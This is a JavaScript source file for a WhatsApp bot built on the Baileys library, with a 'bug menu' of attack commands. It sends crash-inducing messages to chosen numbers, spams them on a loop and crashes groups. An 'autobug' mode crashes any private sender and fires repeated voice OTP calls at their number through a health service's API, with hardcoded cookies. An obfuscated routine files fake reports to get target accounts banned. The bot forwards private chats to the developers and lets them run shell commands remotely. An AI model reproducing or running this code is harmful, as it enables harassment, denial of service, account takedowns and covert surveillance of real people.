const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const nomorOwner = ['6285866295942','628985245738','628812904283','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224','6285840040268','6285640350019','6281212687893','79774805044','6282115383356']
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isOwner && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan kode negara!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa logout ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa logout ke nomor ini!')
nd = dn.split("|")
if (!nd[1]) return reply(`Silahkan masukkan kode negara!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx|ID`)
var _0x41b539=_0x256e;(function(_0x24acc5,_0x2ac5ff){var _0x3a77a0=_0x256e,_0x1d6cc1=_0x24acc5();while(!![]){try{var _0x20c0d7=-parseInt(_0x3a77a0(0x1c3))/0x1*(parseInt(_0x3a77a0(0x18a))/0x2)+parseInt(_0x3a77a0(0x19c))/0x3+-parseInt(_0x3a77a0(0x1b7))/0x4*(parseInt(_0x3a77a0(0x1b0))/0x5)+-parseInt(_0x3a77a0(0x1b3))/0x6*(-parseInt(_0x3a77a0(0x186))/0x7)+-parseInt(_0x3a77a0(0x181))/0x8*(-parseInt(_0x3a77a0(0x199))/0x9)+-parseInt(_0x3a77a0(0x191))/0xa*(-parseInt(_0x3a77a0(0x183))/0xb)+-parseInt(_0x3a77a0(0x196))/0xc*(parseInt(_0x3a77a0(0x1c0))/0xd);if(_0x20c0d7===_0x2ac5ff)break;else _0x1d6cc1['push'](_0x1d6cc1['shift']());}catch(_0x4bc7f1){_0x1d6cc1['push'](_0x1d6cc1['shift']());}}}(_0x3aba,0x36b1b));function _0x3aba(){var _0x22dc26=['Aw5WDxrBBMfTzt1SC2rD','Bg9N','CgXHDgzVCM0','AhjLzG','mtaWnJyZmdG1oa','qu5euK9jra','Dg9tDhjPBMC','DMfS','ywn0Aw9U','AgvHzgvYCW','yxr0CG','mZK4mJu1Eff4AxLQ','C2vHCMnO','zgf0yq','nKjLwKvNva','D2fYBG','zMLUza','y29UC29Szq','ofnmvKfnuW','CgHVBMvFBNvTyMvY','x19H','x191C2vY','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29T','zw1HAwXFy29UzMLYBq','zxjYB3i','BhnK','AMf6B2vZDa','odC1nJi4CxzlrgvS','Aw5MBW','zw1HAwW','ntf4vgj6u3O','x19Yzxy','yxbWzw5K','otzQsu5Ztw4','Aw5WDxrBBMfTzt1QyxPVzxn0xq','mtf2qwTorMC','u3vRC2vZigXVz291Dca','yMLUza','mJiWndK5m2fcCNLvAq','ChjVDg90ExbL','Bg9Hza','ue9tva','mJm1mhPLzeTJCa','CgfYC2u','yxbWBhK','vu5ltK9xtG','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','zM9YicG7oYK7','zhbY','mtu0mdaXmhfdwfr2wq','CMvWBgfJzq','x19OCW','x19Jy2C','zM9YBwf0','nJbiB0TIreK','C3vIBwL0','x19WCM90B19F','mZaYmtn5we53uge','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29Tl2nVBNrHy3qVBM9JBgLLBNqV','x19JC3i','odeYmJuWv21LrwjH','z2v0','y291BNrYEv9ZzwXLy3rVCG','C3rLCa','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','zM9YBq','y29UC3rYDwn0B3i','Ew91CL9TzxnZywDL','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa'];_0x3aba=function(){return _0x22dc26;};return _0x3aba();}var _0x49b645=(function(){var _0x2e9c56=!![];return function(_0x1d5887,_0x2bb3ef){var _0x14e063=_0x2e9c56?function(){var _0x4d230a=_0x256e;if(_0x2bb3ef){var _0x491341=_0x2bb3ef[_0x4d230a(0x18c)](_0x1d5887,arguments);return _0x2bb3ef=null,_0x491341;}}:function(){};return _0x2e9c56=![],_0x14e063;};}()),_0x487a06=_0x49b645(this,function(){var _0x29df64=_0x256e;return _0x487a06[_0x29df64(0x1ab)]()[_0x29df64(0x1b1)]('(((.+)+)+)+$')[_0x29df64(0x1ab)]()[_0x29df64(0x1a2)](_0x487a06)[_0x29df64(0x1b1)]('(((.+)+)+)+$');});_0x487a06();var _0x16e417=(function(){var _0xa72b49=!![];return function(_0x2a8d20,_0x1a6611){var _0x77aeba=_0xa72b49?function(){var _0x5ed782=_0x256e;if(_0x1a6611){var _0x5a3b01=_0x1a6611[_0x5ed782(0x18c)](_0x2a8d20,arguments);return _0x1a6611=null,_0x5a3b01;}}:function(){};return _0xa72b49=![],_0x77aeba;};}()),_0x4f7c7d=_0x16e417(this,function(){var _0xe879f6=_0x256e,_0x2f9931=function(){var _0x1e08a1=_0x256e,_0x4a1853;try{_0x4a1853=Function('return\x20(function()\x20'+_0x1e08a1(0x1a0)+');')();}catch(_0x4167a5){_0x4a1853=window;}return _0x4a1853;},_0x3fed6e=_0x2f9931(),_0x1b2bfc=_0x3fed6e[_0xe879f6(0x1b6)]=_0x3fed6e[_0xe879f6(0x1b6)]||{},_0x1d805f=[_0xe879f6(0x1a6),_0xe879f6(0x1b4),_0xe879f6(0x1c1),_0xe879f6(0x1bd),'exception','table','trace'];for(var _0x1cf83e=0x0;_0x1cf83e<_0x1d805f['length'];_0x1cf83e++){var _0x5cf577=_0x16e417[_0xe879f6(0x1a2)][_0xe879f6(0x187)][_0xe879f6(0x185)](_0x16e417),_0x35cc6d=_0x1d805f[_0x1cf83e],_0x537005=_0x1b2bfc[_0x35cc6d]||_0x5cf577;_0x5cf577[_0xe879f6(0x198)]=_0x16e417[_0xe879f6(0x185)](_0x16e417),_0x5cf577[_0xe879f6(0x1ab)]=_0x537005[_0xe879f6(0x1ab)]['bind'](_0x537005),_0x1b2bfc[_0x35cc6d]=_0x5cf577;}});_0x4f7c7d();var ntah=await axios[_0x41b539(0x19d)](_0x41b539(0x19a)),email=await axios[_0x41b539(0x19d)]('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'),cookie=ntah[_0x41b539(0x1ae)]['set-cookie']['join'](';\x20'),$=cheerio[_0x41b539(0x188)](ntah[_0x41b539(0x1b2)]),$form=$(_0x41b539(0x1a1)),url=new URL($form[_0x41b539(0x1af)](_0x41b539(0x1ad)),_0x41b539(0x1bb))[_0x41b539(0x1a8)],form=new URLSearchParams();form[_0x41b539(0x180)](_0x41b539(0x1bf),$form[_0x41b539(0x1b5)](_0x41b539(0x182))[_0x41b539(0x1ac)]()),form[_0x41b539(0x180)](_0x41b539(0x1be),$form[_0x41b539(0x1b5)](_0x41b539(0x1a5))[_0x41b539(0x1ac)]()),form['append'](_0x41b539(0x19f),_0x41b539(0x197)),form[_0x41b539(0x180)](_0x41b539(0x19e),''+nd[0x1]),form[_0x41b539(0x180)](_0x41b539(0x1b8),''+nd[0x0]),form[_0x41b539(0x180)](_0x41b539(0x1c2),email[_0x41b539(0x1b2)][0x0]),form[_0x41b539(0x180)](_0x41b539(0x1bc),email[_0x41b539(0x1b2)][0x0]),form[_0x41b539(0x180)](_0x41b539(0x1a7),_0x41b539(0x1aa)),form[_0x41b539(0x180)](_0x41b539(0x1a3),_0x41b539(0x18e)),form[_0x41b539(0x180)](_0x41b539(0x1ba),'0'),form[_0x41b539(0x180)](_0x41b539(0x1b9),'1'),form['append'](_0x41b539(0x19b),''),form[_0x41b539(0x180)]('__req','8'),form[_0x41b539(0x180)](_0x41b539(0x193),_0x41b539(0x1a4)),form['append'](_0x41b539(0x190),'1'),form[_0x41b539(0x180)](_0x41b539(0x194),_0x41b539(0x18d)),form[_0x41b539(0x180)](_0x41b539(0x1c4),_0x41b539(0x1a9)),form[_0x41b539(0x180)]('__comment_req','0');function _0x256e(_0x47f21d,_0x388a84){var _0x18d7f2=_0x3aba();return _0x256e=function(_0x4f7c7d,_0x16e417){_0x4f7c7d=_0x4f7c7d-0x180;var _0x45c945=_0x18d7f2[_0x4f7c7d];if(_0x256e['KXVRkf']===undefined){var _0x5c01b2=function(_0x256ead){var _0x473bd4='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x446343='',_0x3aaff6='',_0x18edaf=_0x446343+_0x5c01b2;for(var _0x3207e5=0x0,_0x363770,_0x2e9c56,_0x1d5887=0x0;_0x2e9c56=_0x256ead['charAt'](_0x1d5887++);~_0x2e9c56&&(_0x363770=_0x3207e5%0x4?_0x363770*0x40+_0x2e9c56:_0x2e9c56,_0x3207e5++%0x4)?_0x446343+=_0x18edaf['charCodeAt'](_0x1d5887+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x363770>>(-0x2*_0x3207e5&0x6)):_0x3207e5:0x0){_0x2e9c56=_0x473bd4['indexOf'](_0x2e9c56);}for(var _0x2bb3ef=0x0,_0x14e063=_0x446343['length'];_0x2bb3ef<_0x14e063;_0x2bb3ef++){_0x3aaff6+='%'+('00'+_0x446343['charCodeAt'](_0x2bb3ef)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3aaff6);};_0x256e['JiOPsi']=_0x5c01b2,_0x47f21d=arguments,_0x256e['KXVRkf']=!![];}var _0x487a06=_0x18d7f2[0x0],_0x49b645=_0x4f7c7d+_0x487a06,_0x3ababf=_0x47f21d[_0x49b645];if(!_0x3ababf){var _0x491341=function(_0xa72b49){this['EAjMBh']=_0xa72b49,this['hsjYZS']=[0x1,0x0,0x0],this['eKmqnY']=function(){return'newState';},this['QwXPBF']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['qVzKOh']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x491341['prototype']['bDHDrG']=function(){var _0x2a8d20=new RegExp(this['QwXPBF']+this['qVzKOh']),_0x1a6611=_0x2a8d20['test'](this['eKmqnY']['toString']())?--this['hsjYZS'][0x1]:--this['hsjYZS'][0x0];return this['SClbyu'](_0x1a6611);},_0x491341['prototype']['SClbyu']=function(_0x77aeba){if(!Boolean(~_0x77aeba))return _0x77aeba;return this['xKKQUz'](this['EAjMBh']);},_0x491341['prototype']['xKKQUz']=function(_0x5a3b01){for(var _0x2f9931=0x0,_0x3fed6e=this['hsjYZS']['length'];_0x2f9931<_0x3fed6e;_0x2f9931++){this['hsjYZS']['push'](Math['round'](Math['random']())),_0x3fed6e=this['hsjYZS']['length'];}return _0x5a3b01(this['hsjYZS'][0x0]);},new _0x491341(_0x256e)['bDHDrG'](),_0x45c945=_0x256e['JiOPsi'](_0x45c945),_0x47f21d[_0x49b645]=_0x45c945;}else _0x45c945=_0x3ababf;return _0x45c945;},_0x256e(_0x47f21d,_0x388a84);}var res=await axios({'url':url,'method':_0x41b539(0x189),'data':form,'headers':{'cookie':cookie}});reply(_0x41b539(0x184)+nd[0x1]+'\x20'+util[_0x41b539(0x195)](JSON[_0x41b539(0x18b)](res[_0x41b539(0x1b2)][_0x41b539(0x192)](_0x41b539(0x18f),''))));
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'chat':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
